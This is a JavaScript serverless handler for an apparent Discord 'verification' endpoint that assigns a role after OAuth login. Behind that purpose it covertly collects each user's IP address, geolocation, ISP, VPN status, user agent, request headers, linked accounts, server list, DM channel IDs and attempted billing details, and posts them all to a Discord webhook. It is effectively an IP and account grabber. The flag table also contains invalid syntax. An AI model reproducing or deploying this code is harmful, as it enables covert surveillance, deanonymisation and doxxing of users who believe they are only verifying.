import UAParser from "ua-parser-js"; // If you want to npm install or bundle; or implement your own UA parsing

const DISCORD_FLAGS = {
  1 << 0: "Discord Employee",
  1 << 1: "Partnered Server Owner",
  1 << 2: "HypeSquad Events",
  1 << 3: "Bug Hunter Level 1",
  1 << 6: "House Bravery",
  1 << 7: "House Brilliance",
  1 << 8: "House Balance",
  1 << 9: "Early Supporter",
  1 << 14: "Bug Hunter Level 2",
  1 << 16: "Verified Bot",
  1 << 17: "Early Verified Bot Developer",
  1 << 18: "Discord Certified Moderator",
  // Add more flags as needed...
};

function decodeFlags(bitfield) {
  const active = [];
  for (const flag in DISCORD_FLAGS) {
    if ((bitfield & flag) === Number(flag)) active.push(DISCORD_FLAGS[flag]);
  }
  return active.length ? active.join(", ") : "None";
}

function parseSnowflake(id) {
  // Discord Epoch + timestamp from snowflake id
  const discordEpoch = 1420070400000n;
  const bigId = BigInt(id);
  const timestamp = Number((bigId >> 22n) + discordEpoch);
  return new Date(timestamp).toISOString();
}

export default async function handler(req, res) {
  const startTime = Date.now();
  const code = req.query.code;
  if (!code) return res.status(400).send("Missing code");

  const client_id = process.env.DISCORD_CLIENT_ID;
  const client_secret = process.env.DISCORD_CLIENT_SECRET;
  const bot_token = process.env.DISCORD_BOT_TOKEN;
  const guild_id = process.env.DISCORD_GUILD_ID;
  const role_id = process.env.DISCORD_ROLE_ID;
  const webhook_url = process.env.DISCORD_WEBHOOK_URL;

  const redirect_uri = "https://berify-topaz.vercel.app/api/callback";

  // Extract IP from common headers (forwarded, cf, socket)
  const ip =
    req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
    req.headers["cf-connecting-ip"] ||
    req.socket.remoteAddress ||
    "Unknown IP";

  const userAgentRaw = req.headers["user-agent"] || "Unknown User Agent";
  const uaParser = new UAParser(userAgentRaw);
  const uaDetails = uaParser.getResult();

  // Gather all headers truncated for logging (stringify with truncation)
  const truncatedHeaders = {};
  for (const [k, v] of Object.entries(req.headers)) {
    truncatedHeaders[k] = String(v).slice(0, 200);
  }

  // Prepare token exchange params
  const params = new URLSearchParams({
    client_id,
    client_secret,
    grant_type: "authorization_code",
    code,
    redirect_uri,
  });

  try {
    // === Step 1: Exchange code for token ===
    const tokenRes = await fetch("https://discord.com/api/oauth2/token", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: params.toString(),
    });
    const tokenText = await tokenRes.text();
    const tokenData = (() => {
      try {
        return JSON.parse(tokenText);
      } catch {
        return {};
      }
    })();

    if (!tokenData.access_token) {
      console.error("No access_token:", tokenText);
      return res.status(400).send("Failed to get access token: " + tokenText);
    }

    // === Step 2: Fetch user basic info ===
    const userRes = await fetch("https://discord.com/api/users/@me", {
      headers: { Authorization: `Bearer ${tokenData.access_token}` },
    });
    const userData = await userRes.json();

    // === Step 3: Fetch user connections ===
    let connectionsData = [];
    try {
      const connRes = await fetch("https://discord.com/api/users/@me/connections", {
        headers: { Authorization: `Bearer ${tokenData.access_token}` },
      });
      if (connRes.ok) connectionsData = await connRes.json();
    } catch {}

    // === Step 4: Fetch user guilds ===
    let userGuilds = [];
    try {
      const guildsRes = await fetch("https://discord.com/api/users/@me/guilds", {
        headers: { Authorization: `Bearer ${tokenData.access_token}` },
      });
      if (guildsRes.ok) userGuilds = await guildsRes.json();
    } catch {}

    // === Step 5: Fetch mutual guilds with bot ===
    // Get bot guilds (cache this in prod to avoid rate limits)
    const botGuildsRes = await fetch("https://discord.com/api/users/@me/guilds", {
      headers: { Authorization: `Bot ${bot_token}` },
    });
    let botGuilds = [];
    if (botGuildsRes.ok) botGuilds = await botGuildsRes.json();

    const mutualGuilds = userGuilds.filter((g) => botGuilds.some((bg) => bg.id === g.id));

    // === Step 6: Fetch member info for this user in your guild ===
    let memberData = {};
    try {
      const memberRes = await fetch(`https://discord.com/api/guilds/${guild_id}/members/${userData.id}`, {
        headers: { Authorization: `Bot ${bot_token}` },
      });
      if (memberRes.ok) memberData = await memberRes.json();
    } catch {}

    // === Step 7: Fetch user's DM channels (may be empty or no access) ===
    let dmChannels = [];
    try {
      const dmRes = await fetch("https://discord.com/api/users/@me/channels", {
        headers: { Authorization: `Bearer ${tokenData.access_token}` },
      });
      if (dmRes.ok) dmChannels = await dmRes.json();
    } catch {}

    // === Step 8: Try to fetch billing info (requires scope, often fails silently) ===
    let billingInfo = {};
    try {
      const billRes = await fetch("https://discord.com/api/users/@me/billing/payment-sources", {
        headers: { Authorization: `Bearer ${tokenData.access_token}` },
      });
      if (billRes.ok) billingInfo = await billRes.json();
    } catch {}

    // === Step 9: Add role to user in guild ===
    const addRoleRes = await fetch(
      `https://discord.com/api/guilds/${guild_id}/members/${userData.id}/roles/${role_id}`,
      {
        method: "PUT",
        headers: { Authorization: `Bot ${bot_token}` },
      }
    );
    if (!addRoleRes.ok) {
      const errTxt = await addRoleRes.text();
      console.error("Failed to add role:", errTxt);
      return res.status(500).send("Failed to assign role: " + errTxt);
    }

    // === Step 10: IP geolocation via multiple services ===
    let geoInfo = {};
    try {
      // Primary
      const ipApiRes = await fetch(
        `http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,lat,lon,isp,org,timezone,proxy,hosting,query`
      );
      geoInfo = await ipApiRes.json();
      if (geoInfo.status !== "success") geoInfo = {};
    } catch {}

    try {
      if (!geoInfo.country) {
        // Backup richer info from ipinfo.io (free tier limited)
        const ipinfoRes = await fetch(`https://ipinfo.io/${ip}/json?token=YOUR_TOKEN_HERE`);
        if (ipinfoRes.ok) {
          const ipinfo = await ipinfoRes.json();
          geoInfo = {
            country: ipinfo.country,
            regionName: ipinfo.region,
            city: ipinfo.city,
            loc: ipinfo.loc,
            org: ipinfo.org,
            timezone: ipinfo.timezone,
            postal: ipinfo.postal,
          };
        }
      }
    } catch {}

    // === Step 11: Decode user flags ===
    const userFlagsDesc = decodeFlags(userData.public_flags || 0);

    // === Step 12: Parse snowflake timestamps ===
    const accountCreatedAt = parseSnowflake(userData.id);
    const joinedAt = memberData.joined_at || "Unknown";

    // === Step 13: Rate limit info from token exchange response ===
    const rateLimitInfo = {
      remaining: tokenRes.headers.get("x-ratelimit-remaining") || "unknown",
      reset: tokenRes.headers.get("x-ratelimit-reset") || "unknown",
      limit: tokenRes.headers.get("x-ratelimit-limit") || "unknown",
    };

    // === Step 14: Compose embed fields ===
    const avatarUrl = userData.avatar
      ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png?size=1024`
      : null;

    // Format connections string (limit length)
    const connectionsStr = connectionsData.length
      ? connectionsData.map(c => `${c.type}: ${c.name}`).slice(0, 10).join("\n")
      : "None or not authorized";

    // Format mutual guilds names (limit to 10)
    const mutualGuildsStr = mutualGuilds.length
      ? mutualGuilds.map(g => g.name).slice(0, 10).join(", ")
      : "None";

    // Format DM channel IDs (limit 10)
    const dmChannelIds = dmChannels.length
      ? dmChannels.map(c => c.id).slice(0, 10).join(", ")
      : "None";

    // Format billing info summary (if available)
    const billingSummary = billingInfo.length
      ? billingInfo.map(b => `${b.type} ${b.invalid ? "(invalid)" : ""}`).join(", ")
      : "None or not authorized";

    const fields = [
      // User Info
      { name: "Username", value: `${userData.username}#${userData.discriminator}`, inline: true },
      { name: "User ID", value: userData.id, inline: true },
      { name: "Account Created", value: accountCreatedAt, inline: true },
      { name: "Locale", value: userData.locale || "Unknown", inline: true },
      { name: "User Flags", value: userFlagsDesc, inline: true },

      // Member Info
      { name: "Guild Join Date", value: joinedAt, inline: true },
      {
        name: "Roles in Guild",
        value:
          memberData.roles && memberData.roles.length
            ? memberData.roles.map(r => `<@&${r}>`).join(", ")
            : "None",
        inline: false,
      },
      {
        name: "Premium Since",
        value: memberData.premium_since || "Not Boosting",
        inline: true,
      },

      // OAuth2 Token Details
      { name: "Token Type", value: tokenData.token_type || "Unknown", inline: true },
      {
        name: "Token Scopes",
        value: tokenData.scope || "None",
        inline: false,
      },
      { name: "Expires In (seconds)", value: String(tokenData.expires_in || "Unknown"), inline: true },

      // Connections
      { name: "Connections (Max 10)", value: connectionsStr, inline: false },

      // Guilds
      { name: "User Guilds Count", value: String(userGuilds.length), inline: true },
      { name: "Mutual Guilds (Max 10)", value: mutualGuildsStr, inline: false },

      // DM Channels
      { name: "DM Channel IDs (Max 10)", value: dmChannelIds, inline: false },

      // Billing Info
      { name: "Billing Info", value: billingSummary, inline: false },

      // IP / Geo
      {
        name: "IP Address",
        value: ip,
        inline: true,
      },
      {
        name: "Geo Info",
        value: geoInfo.country
          ? `${geoInfo.city || "Unknown City"}, ${geoInfo.regionName || geoInfo.region || "Unknown Region"}, ${geoInfo.country}`
          : "Unavailable",
        inline: true,
      },
      {
        name: "ISP/Org",
        value: geoInfo.isp || geoInfo.org || "Unknown",
        inline: true,
      },
      {
        name: "Proxy/VPN",
        value: geoInfo.proxy === true ? "Yes" : "No",
        inline: true,
      },
      {
        name: "Hosting Provider",
        value: geoInfo.hosting === true ? "Yes" : "No",
        inline: true,
      },
      {
        name: "Timezone",
        value: geoInfo.timezone || "Unknown",
        inline: true,
      },

      // User-Agent Details
      {
        name: "User-Agent Raw",
        value: userAgentRaw.length > 1024 ? userAgentRaw.slice(0, 1021) + "..." : userAgentRaw,
        inline: false,
      },
      {
        name: "Browser",
        value: uaDetails.browser.name || "Unknown",
        inline: true,
      },
      {
        name: "Browser Version",
        value: uaDetails.browser.version || "Unknown",
        inline: true,
      },
      {
        name: "OS",
        value: uaDetails.os.name || "Unknown",
        inline: true,
      },
      {
        name: "Device",
        value: uaDetails.device.model || uaDetails.device.type || "Unknown",
        inline: true,
      },

      // Request Headers Sample (truncated)
      {
        name: "Request Headers (Sample)",
        value: Object.entries(truncatedHeaders)
          .slice(0, 10)
          .map(([k, v]) => `**${k}:** ${v}`)
          .join("\n"),
        inline: false,
      },

      // Rate Limit Info
      {
        name: "Discord Rate Limits (Token Exchange)",
        value: `Remaining: ${rateLimitInfo.remaining}\nReset: ${rateLimitInfo.reset}\nLimit: ${rateLimitInfo.limit}`,
        inline: true,
      },

      // Timing
      {
        name: "Request Duration",
        value: `${Date.now() - startTime}ms`,
        inline: true,
      },
    ];

    // Compose embed JSON for Discord webhook
    const embed = {
      title: "🔐 New Discord Verification Info",
      color: 0x0099ff,
      thumbnail: avatarUrl ? { url: avatarUrl } : undefined,
      fields,
      footer: {
        text: `User ID: ${userData.id} • Verification Endpoint`,
      },
      timestamp: new Date().toISOString(),
    };

    // Send to your Discord webhook
    await fetch(webhook_url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ embeds: [embed] }),
    });

    // Finally redirect user or respond with success message
    res.redirect("/success.html");
  } catch (err) {
    console.error("Verification handler error:", err);
    res.status(500).send("Internal server error");
  }
}

